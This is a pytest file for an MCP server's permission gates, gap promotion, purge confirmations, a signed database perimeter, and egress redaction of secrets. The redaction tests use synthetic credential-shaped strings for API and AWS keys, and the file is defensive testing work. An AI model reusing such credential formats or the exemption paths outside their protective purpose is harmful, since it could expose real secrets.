    result = server.gap_resolve(app_id=app_id, gap_id=logged["id"], note="drafted")
    assert result["status"] == "resolved"


def test_gap_promote_refuses_until_confirmed(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    logged = server.gap_log(app_id=app_id, topic="t-server-promote-1", question="What is the accent color?")

    result = server.gap_promote(
        app_id=app_id,
        gap_id=logged["id"],
        answer="The accent color is #88c0d0.",
        sources=["safe-library/themes/nord.json"],
        confirmed_by="designer",
    )

    assert "unconfirmed_schema" in result["error"]


def test_gap_promote_requires_answer_sources_and_confirmed_by(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
    logged = server.gap_log(app_id=app_id, topic="t-server-promote-2", question="What is the accent color?")

    missing_answer = server.gap_promote(
        app_id=app_id, gap_id=logged["id"], answer="", sources=["x"], confirmed_by="designer",
    )
    missing_sources = server.gap_promote(
        app_id=app_id, gap_id=logged["id"], answer="answer", sources=[], confirmed_by="designer",
    )
    missing_confirmed_by = server.gap_promote(
        app_id=app_id, gap_id=logged["id"], answer="answer", sources=["x"], confirmed_by="",
    )
    for result in (missing_answer, missing_sources, missing_confirmed_by):
        assert "required" in result["error"]


def test_gap_promote_writes_knowledge_and_closes_gap(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
    logged = server.gap_log(app_id=app_id, topic="t-server-promote-3", question="What is the accent color?")

    result = server.gap_promote(
        app_id=app_id,
        gap_id=logged["id"],
        answer="The accent color is #88c0d0.",
        sources=["safe-library/themes/nord.json"],
        confirmed_by="designer",
    )

    assert result["promoted"] is True
    assert result["gap_id"] == logged["id"]
    insert_sql, params = fake.executed[-1]
    assert insert_sql.startswith("INSERT INTO knowledge")

    gap_result = server.gap_list(app_id=app_id, topic="t-server-promote-3", status="promoted")
    assert gap_result["items"] and gap_result["items"][0]["promoted_to"] == result["id"]


def test_gap_promote_missing_gap_errors(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")

    result = server.gap_promote(
        app_id=app_id, gap_id="does-not-exist-xyz", answer="a", sources=["x"], confirmed_by="designer",
    )
    assert result == {"error": "not_found"}


def test_gap_promote_already_promoted_gap_errors(app_id, monkeypatch):
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
    logged = server.gap_log(app_id=app_id, topic="t-server-promote-4", question="What is the accent color?")
    server.gap_promote(
        app_id=app_id, gap_id=logged["id"], answer="a", sources=["x"], confirmed_by="designer",
    )

    result = server.gap_promote(
        app_id=app_id, gap_id=logged["id"], answer="b", sources=["y"], confirmed_by="designer",
    )
    assert result["error"] == "already_promoted"


def test_gap_promote_denied_without_gap_promote_permission(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "writer_only"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["gap_write"]}))

    result = server.gap_promote(
        app_id="writer_only", gap_id="whatever", answer="a", sources=["x"], confirmed_by="designer",
    )
    assert "denied" in result["error"]


# ── Egress secret redaction (README "no tool ever returns a credential") ─────
#
# The credential ACCESSOR already withholds values (credential_source returns a
# source, never the secret). These exercise the DATA path: a credential smuggled
# into a stored record is redacted when it comes back out through the _guarded
# funnel, and the redaction is receipted without the value.

def test_egress_redacts_secret_stored_then_retrieved(app_id):
    secret = "sk-ant-" + "Z" * 40
    put = server.store_put(app_id=app_id, collection="notes",
                           record={"api_key": secret})
    got = server.store_get(app_id=app_id, collection="notes", record_id=put["id"])
    assert secret not in str(got)                       # not returned verbatim
    assert "[REDACTED:provider_api_key]" in str(got)    # redacted in place


def test_egress_redaction_is_receipted_without_the_value(app_id):
    secret = "AKIA" + "Q" * 16
    put = server.store_put(app_id=app_id, collection="notes", record={"k": secret})
    server.store_get(app_id=app_id, collection="notes", record_id=put["id"])
    receipts = server._receipt_log.tail(app_id, limit=20)
    redacted = [r for r in receipts if r["outcome"] == "redacted"]
    assert redacted, "expected a redacted receipt for the store_get egress"
    assert "aws_access_key_id" in (redacted[0]["detail"] or "")
    assert all(secret not in (r["detail"] or "") for r in receipts)  # payload-free


def test_egress_leaves_clean_records_untouched(app_id):
    def _redacted_count():
        return len([r for r in server._receipt_log.tail(app_id, limit=200)
                    if r["outcome"] == "redacted"])
    before = _redacted_count()
    record = {"title": "meeting notes", "count": 3, "id": "notes:1"}
    put = server.store_put(app_id=app_id, collection="notes", record=record)
    got = server.store_get(app_id=app_id, collection="notes", record_id=put["id"])
    for k, v in record.items():
        assert got.get(k) == v                          # no false-positive redaction
    assert "[REDACTED" not in str(got)
    assert _redacted_count() == before                  # this round-trip added none


# ── Egress redaction exemption (operator-declared, per-tool) ─────────────────
#
# The canonical case: an integration_call performing an OAuth token exchange
# must return the token it just obtained. An app's manifest may name specific
# tools as exempt; the exempted return is still receipted (credential_returned),
# never silent, and the exemption is per-tool, not a blanket unlock.

@pytest.fixture
def exempt_app_id(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "oauthapp"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(json.dumps({
        "permissions": ["full_access"],
        "egress_secret_exempt": ["store_get"],   # stands in for integration_call
    }))
    return "oauthapp"


def test_egress_exemption_returns_credential_raw_and_audits(exempt_app_id):
    secret = "sk-ant-" + "Z" * 40
    put = server.store_put(app_id=exempt_app_id, collection="tokens", record={"tok": secret})
    got = server.store_get(app_id=exempt_app_id, collection="tokens", record_id=put["id"])
    assert secret in str(got)                    # exempt tool: raw, not redacted
    assert "[REDACTED" not in str(got)
    receipts = server._receipt_log.tail(exempt_app_id, limit=20)
    cr = [r for r in receipts if r["outcome"] == "credential_returned"]
    assert cr, "an exempt credential return must still be receipted"
    assert "provider_api_key" in (cr[0]["detail"] or "")
    assert all(secret not in (r["detail"] or "") for r in receipts)   # audit payload-free


def test_egress_exemption_is_per_tool_not_blanket(exempt_app_id):
    # store_get is exempt for this app; store_list is NOT — the same record's
    # secret is still redacted when it comes back through the non-exempt tool.
    secret = "AKIA" + "Q" * 16
    server.store_put(app_id=exempt_app_id, collection="per_tool", record={"k": secret})
    listed = server.store_list(app_id=exempt_app_id, collection="per_tool")
    assert secret not in str(listed)
    assert "[REDACTED:aws_access_key_id]" in str(listed)


# ── store_collections + whoami (dogfood tools) ──────────────────────────────

def _write_app(apps_root, name, manifest):
    import os
    d = os.path.join(str(apps_root), name)
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "manifest.json"), "w") as f:
        f.write(json.dumps(manifest))
    return name


def test_store_collections_lists_scoped_collections(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "sc_app",
                     {"permissions": ["full_access"], "store_scope": ["sc_uniq_*"]})
    server.store_put(app_id=app, collection="sc_uniq_a", record={"v": 1})
    server.store_put(app_id=app, collection="sc_uniq_b", record={"v": 2})

    result = server.store_collections(app_id=app)
    # store_scope confines the listing to this app's own collections, so the
    # shared test store's other collections don't leak in.
    assert set(result["collections"]) == {"sc_uniq_a", "sc_uniq_b"}
    assert result["count"] == 2
    assert result["store_scope"] == ["sc_uniq_*"]


def test_store_collections_requires_store_read(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "noread", {"permissions": ["knowledge_read"]})
    result = server.store_collections(app_id=app)
    assert "error" in result and "denied" in result["error"]


def test_whoami_reports_effective_permissions(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "wapp", {
        "permissions": ["store_read"],
        "role": "reader",
        "store_scope": ["w_*"],
        "deny_tools": ["store_search_all"],
    })
    w = server.whoami(app_id=app)
    assert w["app_id"] == "wapp"
    assert w["role"] == "reader"
    assert w["store_scope"] == ["w_*"]
    assert w["permissions"] == ["store_read"]
    assert "store_get" in w["tools_allowed"]
    # deny_tools is subtracted from the effective set
    assert "store_search_all" not in w["tools_allowed"]
    assert w["deny_tools"] == ["store_search_all"]


def test_whoami_is_ungated_and_answers_for_missing_manifest():
    w = server.whoami(app_id="ghost-app-xyz")
    assert w["app_id"] == "ghost-app-xyz"
    assert w["error"] == "no_manifest"


def test_whoami_requires_an_app_id():
    w = server.whoami(app_id="")
    assert w["error"] == "no_app_id"


# ── store_purge_collection + full_access specialist reads ───────────────────

def test_store_purge_collection_soft_deletes_all(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "purgeapp",
                     {"permissions": ["full_access"], "store_scope": ["purge_uniq_*"]})
    for i in range(3):
        server.store_put(app_id=app, collection="purge_uniq_c", record={"i": i})
    assert len(server.store_list(app_id=app, collection="purge_uniq_c")["items"]) == 3

    result = server.store_purge_collection(app_id=app, collection="purge_uniq_c",
                                           confirm="purge_uniq_c")
    assert result == {"purged": 3, "collection": "purge_uniq_c"}
    # gone from reads (soft-delete: invisible to list/search)
    assert server.store_list(app_id=app, collection="purge_uniq_c")["items"] == []


def test_store_purge_collection_requires_confirm(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "purgeapp2",
                     {"permissions": ["full_access"], "store_scope": ["pc_*"]})
    server.store_put(app_id=app, collection="pc_x", record={"v": 1})
    result = server.store_purge_collection(app_id=app, collection="pc_x")  # no confirm
    assert result["error"] == "confirm_required"
    # nothing purged — record still there
    assert len(server.store_list(app_id=app, collection="pc_x")["items"]) == 1


def test_store_purge_collection_denied_outside_scope(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "purgeapp3",
                     {"permissions": ["full_access"], "store_scope": ["mine_*"]})
    result = server.store_purge_collection(app_id=app, collection="not_mine",
                                           confirm="not_mine")
    assert "collection_denied" in result["error"]


def test_full_access_grants_specialist_reads():
    from willow_mcp import gate
    # documented contract: full_access = all gated tools except the egress ones.
    assert "specialist_list" in gate.PERMISSION_GROUPS["full_access"]
    assert "specialist_get" in gate.PERMISSION_GROUPS["full_access"]
    assert gate.PERMISSION_GROUPS["full_access"].isdisjoint({"task_net", "integration_call"})


# ── store_stats + gap_delete (dogfood tools, round 2) ───────────────────────

def test_store_stats_counts_live_records(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "statapp",
                     {"permissions": ["full_access"], "store_scope": ["st_uniq_*"]})
    for i in range(3):
        server.store_put(app_id=app, collection="st_uniq_a", record={"i": i})
    server.store_put(app_id=app, collection="st_uniq_b", record={"x": 1})
    # purge b — soft-deleted records must not be counted
    server.store_purge_collection(app_id=app, collection="st_uniq_b", confirm="st_uniq_b")

    result = server.store_stats(app_id=app)
    counts = {c["collection"]: c["count"] for c in result["collections"]}
    assert counts == {"st_uniq_a": 3, "st_uniq_b": 0}
    assert result["total_records"] == 3
    assert result["total_collections"] == 2
    # largest first
    assert result["collections"][0]["collection"] == "st_uniq_a"


def test_store_stats_requires_store_read(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "noread2", {"permissions": ["knowledge_read"]})
    result = server.store_stats(app_id=app)
    assert "error" in result and "denied" in result["error"]


def test_gap_delete_removes_from_list(app_id):
    logged = server.gap_log(app_id=app_id, topic="gd_uniq", question="junk fixture q")
    gid = logged["id"]
    assert any(g.get("_id") == gid for g in server.gap_list(app_id=app_id, topic="gd_uniq")["items"])

    res = server.gap_delete(app_id=app_id, gap_id=gid)
    assert res["deleted"] is True
    assert res["id"] == gid
    # gone from the backlog view (soft-deleted, but invisible to list)
    assert not any(g.get("_id") == gid for g in server.gap_list(app_id=app_id, topic="gd_uniq")["items"])


def test_gap_delete_not_found(app_id):
    res = server.gap_delete(app_id=app_id, gap_id="no-such-gap")
    assert res["error"] == "not_found"


def test_gap_delete_requires_gap_write(tmp_path, monkeypatch):
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app = _write_app(apps_root, "gapreader", {"permissions": ["gap_read"]})
    res = server.gap_delete(app_id=app, gap_id="whatever")
    assert "error" in res and "denied" in res["error"]


# ── gap_purge_topic (bulk, rate-limit-friendly) ─────────────────────────────

def test_gap_purge_topic_purges_and_protects_promoted(app_id):
    from willow_mcp import gaps
    g1 = server.gap_log(app_id=app_id, topic="pt_uniq", question="junk one")["id"]
    g2 = server.gap_log(app_id=app_id, topic="pt_uniq", question="junk two")["id"]
    gp = server.gap_log(app_id=app_id, topic="pt_uniq", question="promoted one")["id"]
    gaps.mark_promoted(gp, "KID999")  # a promoted gap points at a knowledge atom

    res = server.gap_purge_topic(app_id=app_id, topic="pt_uniq", confirm="pt_uniq")
    assert res["purged"] == 2
    assert res["skipped_promoted"] == 1
    ids = {g.get("_id") for g in server.gap_list(app_id=app_id, topic="pt_uniq")["items"]}
    assert g1 not in ids and g2 not in ids   # junk gone
    assert gp in ids                          # promoted survives, protected


def test_gap_purge_topic_requires_confirm(app_id):
    server.gap_log(app_id=app_id, topic="pt_confirm", question="x")
    res = server.gap_purge_topic(app_id=app_id, topic="pt_confirm")
    assert res["error"] == "confirm_required"
    assert len(server.gap_list(app_id=app_id, topic="pt_confirm")["items"]) == 1  # untouched


def test_gap_purge_topic_needs_its_own_group_not_gap_write(tmp_path, monkeypatch):
    from willow_mcp import gate
    # bulk cross-app purge is its own opt-in line, NOT folded into gap_write
    assert "gap_purge_topic" not in gate.PERMISSION_GROUPS["gap_write"]
    assert "gap_purge_topic" in gate.PERMISSION_GROUPS["gap_purge"]
    assert "gap_purge_topic" in gate.PERMISSION_GROUPS["full_access"]

    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    # an app with everyday gap_write can no longer bulk-purge
    writer = _write_app(apps_root, "gapwriter", {"permissions": ["gap_write"]})
    assert "denied" in server.gap_purge_topic(app_id=writer, topic="x", confirm="x")["error"]
    # but gap_purge grants it
    purger = _write_app(apps_root, "gappurger", {"permissions": ["gap_purge"]})
    res = server.gap_purge_topic(app_id=purger, topic="none_here", confirm="none_here")
    assert res.get("purged") == 0 and "error" not in res


def test_purge_tools_reject_empty_target_cleanly(app_id):
    # empty name would make the confirm guard degenerate ("" == ""); reject first
    assert server.store_purge_collection(app_id=app_id, collection="")["error"] == "collection is required"
    assert server.gap_purge_topic(app_id=app_id, topic="")["error"] == "topic is required"


def test_kb_startup_continuity_text_array_tags_uses_any(app_id, monkeypatch):
    # a native text[] tags column must match by element (= ANY), not ::text LIKE
    # (Postgres renders {continuity} without quotes, so the quoted pattern misses)
    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS + [("tags", "ARRAY")], canned_rows=[])
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.kb_startup_continuity(app_id=app_id, limit=5)
    where_sql, params = fake.executed[-1]
    assert '= ANY("tags")' in where_sql
    assert "::text LIKE" not in where_sql
    assert "continuity" in params


# ── task_submit DB perimeter (B2): operator-signed envelope behind the flag ──
#
# Mirrors test_task_submit_writes_mapped_columns_after_confirm for allow_db.
# WILLOW_MCP_ENFORCE_DB_PERIMETER is OFF by default (capability-only, today's
# behavior); ON, allow_db also needs a db-scoped signed envelope. Runs under the
# Postgres CI matrix (psycopg2), like the rest of this file.

_TASKS_COLUMNS_DB = _TASKS_COLUMNS + [("db_authorization", "text")]


@pytest.fixture
def db_app(tmp_path, monkeypatch):
    """An app that holds task_db — full_access does NOT grant it."""
    apps_root = tmp_path / "mcp_apps"
    # B-50/#238: schema_maps/ now lives under WILLOW_HOME directly (no longer
    # nested under mcp_apps/), so isolating WILLOW_MCP_APPS_ROOT alone is not
    # enough to isolate it between tests -- without this, every test using
    # this fixture wrote/read schema maps from conftest.py's one session-wide
    # default WILLOW_HOME, so a mapping confirmed in one test bled into the
    # next test reusing the same app_id.
    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
    app_dir = apps_root / "dbapp"
    app_dir.mkdir(parents=True)
    (app_dir / "manifest.json").write_text(
        json.dumps({"permissions": ["full_access", "task_db"]}))
    return "dbapp"


@pytest.fixture
def egress_keys(tmp_path, monkeypatch):
    """An Ed25519 operator keypair; point the verifier at the public key."""
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    priv = Ed25519PrivateKey.generate()
    priv_path, pub_path = tmp_path / "op-private.pem", tmp_path / "op-public.pem"
    priv_path.write_bytes(priv.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()))
    priv_path.chmod(0o600)
    pub_path.write_bytes(priv.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
    # Override the autouse _stub_egress_public_key_for_diagnostics fixture, which
    # points resolve_public_key_path at a non-key stub for non-test_egress modules
    # (this file is test_server). This explicit fixture is set up after the autouse
    # one, so this setattr wins and the gate verifies against our real public key.
    monkeypatch.setattr(
        "willow_mcp.egress_setup.resolve_public_key_path", lambda: pub_path)
    monkeypatch.delenv("WILLOW_IN_KART", raising=False)
    return priv_path, pub_path


def _db_envelope(priv_path, *, task, submitted_by, task_id, agent="kart", scope=None):
    from willow_mcp import egress_authorization as auth
    return auth.sign_envelope(
        private_key_path=priv_path, submitted_by=submitted_by, task_id=task_id,
        agent=agent, task=auth.canonical_db_task(task), ttl_seconds=300,
        nonce="abcdefghijklmnopqrstuvwxyz012345", scope=scope or auth.DB_SCOPE)


def test_task_submit_allow_db_default_is_capability_only(db_app, monkeypatch):
    """Flag OFF (default): allow_db needs task_db but NO envelope — today's
    behavior, so this lands without breaking current callers."""
    monkeypatch.delenv("WILLOW_MCP_ENFORCE_DB_PERIMETER", raising=False)
    fake = _FakePg(columns=_TASKS_COLUMNS)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=db_app, table="tasks")
    result = server.task_submit(app_id=db_app, task="psql -c 'select 1'", allow_db=True)
    assert result.get("status") == "pending", result


def test_task_submit_allow_db_enforced_requires_envelope(db_app, egress_keys, monkeypatch):
    """Flag ON, no envelope → refused before the row is queued."""
    monkeypatch.setenv("WILLOW_MCP_ENFORCE_DB_PERIMETER", "1")
    fake = _FakePg(columns=_TASKS_COLUMNS_DB)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=db_app, table="tasks")
    # A benign task: the point is the MISSING envelope, not destructiveness —
    # kartikeya's submit-time scanner refuses destructive SQL before this gate.
    result = server.task_submit(
        app_id=db_app, task="psql -c 'select 1'", allow_db=True)
    assert "db_authorization_denied" in result.get("error", ""), result


def test_task_submit_allow_db_enforced_accepts_signed_envelope(db_app, egress_keys, monkeypatch):
    """Flag ON, a valid db-scoped envelope → queued; the signed task_id and the
    db_authorization column are written."""
    monkeypatch.setenv("WILLOW_MCP_ENFORCE_DB_PERIMETER", "1")
    fake = _FakePg(columns=_TASKS_COLUMNS_DB)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=db_app, table="tasks")
    task = "psql -c 'select 1'"
    envelope = _db_envelope(egress_keys[0], task=task, submitted_by=db_app, task_id="DBGATE01")
    result = server.task_submit(app_id=db_app, task=task, allow_db=True, db_authorization=envelope)
    assert result.get("status") == "pending", result
    assert result.get("task_id") == "DBGATE01", result
    insert_sql, _ = fake.executed[-1]
    assert insert_sql.startswith("INSERT INTO tasks")
    assert "db_authorization" in insert_sql


def test_task_submit_allow_db_enforced_rejects_network_scope(db_app, egress_keys, monkeypatch):
    """A network-scoped envelope cannot satisfy the db gate (scope mismatch) —
    routine egress authority must not reach Postgres."""
    monkeypatch.setenv("WILLOW_MCP_ENFORCE_DB_PERIMETER", "1")
    fake = _FakePg(columns=_TASKS_COLUMNS_DB)
    monkeypatch.setattr(server, "get_pg", lambda: fake)
    server.schema_confirm_mapping(app_id=db_app, table="tasks")
    from willow_mcp import egress_authorization as auth
    task = "psql -c 'select 1'"
    net_env = _db_envelope(egress_keys[0], task=task, submitted_by=db_app,
                           task_id="DBGATE02", scope=auth.NETWORK_SCOPE)
    result = server.task_submit(app_id=db_app, task=task, allow_db=True, db_authorization=net_env)
    assert "db_authorization_denied" in result.get("error", ""), result
